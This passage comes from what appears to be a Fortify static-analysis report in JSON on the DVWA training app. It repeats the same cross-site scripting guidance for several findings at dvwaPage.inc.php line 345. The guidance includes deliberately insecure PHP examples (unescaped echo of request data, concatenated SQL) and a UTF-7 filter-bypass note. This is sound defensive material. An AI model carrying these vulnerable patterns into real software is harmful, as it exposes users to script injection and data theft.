query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4575/?engineType=SCA&issue=894E16F090BC6315DEC45E4C88AEE716"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4600",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4600/?engineType=SCA&issue=95F5B989B86265FDF8BF8D2DCF60A979"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4606",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4606/?engineType=SCA&issue=97D3BA22BF5E97B309DFFFD0E58C9E63"
          },
          "properties" : {
            "tags" : [ "Critical" ],
            "precision" : "high"
          }
        }, {
          "id" : "4607",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Poor Validation"
          },
          "fullDescription" : {
            "text" : "In dvwaPage.inc.php, the program uses HTML, XML, or other types of encoding that is not always enough to prevent malicious code from reaching the web browser.\n\n\n"
          },
          "help" : {
            "text" : "The use of certain encoding functions, such as htmlspecialchars() or htmlentities(), will prevent some, but not all cross-site scripting attacks. Depending on the context in which the data appear, characters beyond the basic &lt;, &gt;, &amp;, and \" that are HTML-encoded and those beyond &lt;, &gt;, &amp;, \", and ' (only when ENT_QUOTES is set) that are XML-encoded may take on meta-meaning. Relying on such encoding functions is equivalent to using a weak deny list to prevent cross-site scripting and might allow an attacker to inject malicious code that will be executed in the browser. Because accurately identifying the context in which the data appear statically is not always possible, the Fortify Secure Coding Rulepacks reports cross-site scripting findings even when encoding is applied and presents them as Cross-Site Scripting: Poor Validation issues.\n\nCross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, an untrusted source is most frequently a web request, and in the case of persistent (also known as stored) XSS -- it is the results of a database query.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is weakly validated with HTML encoding and written out to a browser at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following code segment reads in the text parameter, from an HTTP request, HTML-encodes it, and displays it in an alert box in between script tags.\n\n\n&lt;?php\n    $var=$_GET['text'];\n    ...\n    $var2=htmlspecialchars($var);\n    echo \"&lt;script&gt;alert('$var2')&lt;/script&gt;\";\n?&gt;\n\n\nThe code in this example operates correctly if text contains only standard alphanumeric text. If text has a single quote, a round bracket and a semicolon, it ends the alert textbox thereafter the code will be executed.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- The application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause XSS vulnerabilities occur when an application includes malicious data in its output, one logical approach is to validate data immediately before it leaves the application. However, because web applications often have complex and intricate code for generating dynamic content, this method is prone to errors of omission (missing validation). An effective way to mitigate this risk is to also perform input validation for XSS.\n\nWeb applications must validate all input to prevent other vulnerabilities, such as SQL injection, so augmenting an application's existing input validation mechanism to include checks for XSS is generally relatively easy. Despite its value, input validation for XSS does not take the place of rigorous output validation. An application might accept input through a shared data store or other trusted source, and that data store might accept input from a source that does not perform adequate input validation. Therefore, the application cannot implicitly rely on the safety of this or any other data. This means that the best way to prevent XSS vulnerabilities is to validate everything that enters the application and leaves the application destined for the user.\n\nThe most secure approach to validation for XSS is to create an allow list of safe characters that can appear in HTTP content and accept input composed exclusively of characters in the approved set. For example, a valid username might only include alphanumeric characters or a phone number might only include digits 0-9. However, this solution is often infeasible in web applications because many characters that have special meaning to the browser must be considered valid input after they are encoded, such as a web design bulletin board that must accept HTML fragments from its users.\n\nA more flexible, but less secure approach is to implement a deny list, which selectively rejects or escapes potentially dangerous characters before using the input. To form such a list, you first need to understand the set of characters that hold special meaning for web browsers. Although the HTML standard defines which characters have special meaning, many web browsers try to correct common mistakes in HTML and might treat other characters as special in certain contexts. This is why we do not recommend the use of deny lists as a means to prevent XSS. The CERT(R) Coordination Center at the Software Engineering Institute at Carnegie Mellon University provides the following details about special characters in various contexts [1]:\n\nIn the content of a block-level element (in the middle of a paragraph of text):\n\n- \"&lt;\" is special because it introduces a tag.\n\n- \"&amp;\" is special because it introduces a character entity.\n\n- \"&gt;\" is special because some browsers treat it as special, on the assumption that the author of the page intended to include an opening \"&lt;\", but omitted it in error.\n\nThe following principles apply to attribute values:\n\n- In attribute values enclosed in double quotes, the double quotes are special because they mark the end of the attribute value.\n\n- In attribute values enclosed in single quotes, the single quotes are special because they mark the end of the attribute value.\n\n- In attribute values without any quotes, white-space characters, such as space and tab, are special.\n\n- \"&amp;\" is special when used with certain attributes, because it introduces a character entity.\n\nIn URLs, for example, a search engine might provide a link within the results page that the user can click to re-run the search. This can be implemented by encoding the search query inside the URL, which introduces additional special characters:\n\n- Space, tab, and new line are special because they mark the end of the URL.\n\n- \"&amp;\" is special because it either introduces a character entity or separates CGI parameters.\n\n- Non-ASCII characters (that is, everything greater than 127 in the ISO-8859-1 encoding) are not allowed in URLs, so they are considered to be special in this context.\n\n- The \"%\" symbol must be filtered from input anywhere parameters encoded with HTTP escape sequences are decoded by server-side code. For example, \"%\" must be filtered if input such as \"%68%65%6C%6C%6F\" becomes \"hello\" when it appears on the web page.\n\n\nWithin the body of a &lt;SCRIPT&gt; &lt;/SCRIPT&gt;:\n\n- Semicolons, parentheses, curly braces, and new line characters must be filtered out in situations where text could be inserted directly into a pre-existing script tag.\n\nServer-side scripts:\n\n- Server-side scripts that convert any exclamation characters (!) in input to double-quote characters (\") on output might require additional filtering.\n\nOther possibilities:\n\n- If an attacker submits a request in UTF-7, the special character '&lt;' appears as '+ADw-' and might bypass filtering. If the output is included in a page that does not explicitly specify an encoding format, then some browsers try to intelligently identify the encoding based on the content (in this case, UTF-7).\n\nAfter you identify the correct points in an application to perform validation for XSS attacks and what special characters the validation should consider, the next challenge is to identify how your validation handles special characters. If special characters are not considered valid input to the application, then you can reject any input that contains special characters as invalid. A second option is to remove special characters with filtering. However, filtering has the side effect of changing any visual representation of the filtered content and might be unacceptable in circumstances where the integrity of the input must be preserved for display.\n\nIf input containing special characters must be accepted and displayed accurately, validation must encode any special characters to remove their significance. A complete list of ISO 8859-1 encoded values for special characters is provided as part of the official HTML specification [2].\n\nMany application servers attempt to limit an application's exposure to cross-site scripting vulnerabilities by providing implementations for the functions responsible for setting certain specific HTTP response content that perform validation for the characters essential to a cross-site scripting attack. Do not rely on the server running your application to make it secure. For any developed application, there are no guarantees about which application servers it will run on during its lifetime. As standards and known exploits evolve, there are no guarantees that application servers will continue to stay in sync.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4607/?engineType=SCA&issue=994235208C1BDA4E79CC46B03DD19681"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4615",
          "shortDescription" : {
            "text" : "Cross-Site Scripting: Reflected"
          },
          "fullDescription" : {
            "text" : "Line 345 of dvwaPage.inc.php sends unvalidated data to a web browser, which can result in the browser executing malicious code.\n\n\n"
          },
          "help" : {
            "text" : "Cross-site scripting (XSS) vulnerabilities occur when:\n\n1. Data enters a web application through an untrusted source. In the case of reflected XSS, the untrusted source is typically a web request, while in the case of persisted (also known as stored) XSS it is typically a database or other back-end data store.\n\n\n2. The data is included in dynamic content that is sent to a web user without validation.\n\nIn this case, the data is sent at builtin_echo() in dvwaPage.inc.php on line 345.\n\nThe malicious content sent to the web browser often takes the form of a JavaScript segment, but can also include HTML, Flash or any other type of code that the browser executes. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data such as cookies or other session information to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user's machine under the guise of the vulnerable site.\n\nExample 1: The following PHP code segment reads an employee ID, eid, from an HTTP request and displays it to the user.\n\n\n&lt;?php\n\t$eid = $_GET['eid'];\n\t...\n?&gt;\n...\n&lt;?php\n\techo \"Employee ID: $eid\";\n?&gt;\n\n\nThe code in this example operates correctly if eid contains only standard alphanumeric text. If eid has a value that includes metacharacters or source code, then the code is executed by the web browser as it displays the HTTP response.\n\nInitially this might not appear to be much of a vulnerability. After all, why would someone enter a URL that causes malicious code to run on their own computer? The real danger is that an attacker will create the malicious URL, then use email or social engineering tricks to lure victims into visiting a link to the URL. When victims click the link, they unwittingly reflect the malicious content through the vulnerable web application back to their own computers. This mechanism of exploiting vulnerable web applications is known as Reflected XSS.\n\nExample 2: The following PHP code segment queries a database for an employee with a given ID and prints the corresponding employee's name.\n\n\n&lt;?php...\n $con = mysql_connect($server,$user,$password);\n ...\n $result = mysql_query(\"select * from emp where id=\"+eid);\n $row = mysql_fetch_array($result)\n echo 'Employee name: ', mysql_result($row,0,'name');\n ...\n?&gt;\n\n\nAs in Example 1, this code functions correctly when the values of name are well-behaved, but it does nothing to prevent exploits if they are not. Again, this code can appear less dangerous because the value of name is read from a database, whose contents are apparently managed by the application. However, if the value of name originates from user-supplied data, then the database can be a conduit for malicious content. Without proper input validation on all data stored in the database, an attacker may execute malicious commands in the user's web browser. This type of exploit, known as Persistent (or Stored) XSS, is particularly insidious because the indirection caused by the data store makes it difficult to identify the threat and increases the possibility that the attack might affect multiple users. XSS got its start in this form with web sites that offered a \"guestbook\" to visitors. Attackers would include JavaScript in their guestbook entries, and all subsequent visitors to the guestbook page would execute the malicious code.\n\nAs the examples demonstrate, XSS vulnerabilities are caused by code that includes unvalidated data in an HTTP response. There are three vectors by which an XSS attack can reach a victim:\n\n- As in Example 1, data is read directly from the HTTP request and reflected back in the HTTP response. Reflected XSS exploits occur when an attacker causes a user to supply dangerous content to a vulnerable web application, which is then reflected back to the user and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or emailed directly to victims. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces victims to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the user, the content is executed and proceeds to transfer private information, such as cookies that might include session information, from the user's machine to the attacker or perform other nefarious activities.\n\n- As in Example 2, the application stores dangerous data in a database or other trusted data store. The dangerous data is subsequently read back into the application and included in dynamic content. Persistent XSS exploits occur when an attacker injects dangerous content into a data store that is later read and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user.\n\n- A source outside the application stores dangerous data in a database or other data store, and the dangerous data is subsequently read back into the application as trusted data and included in dynamic content.\n\nThe solution to prevent XSS is to ensure that validation occurs in the required places and that relevant properties are set to prevent vulnerabilities.\n\nBecause 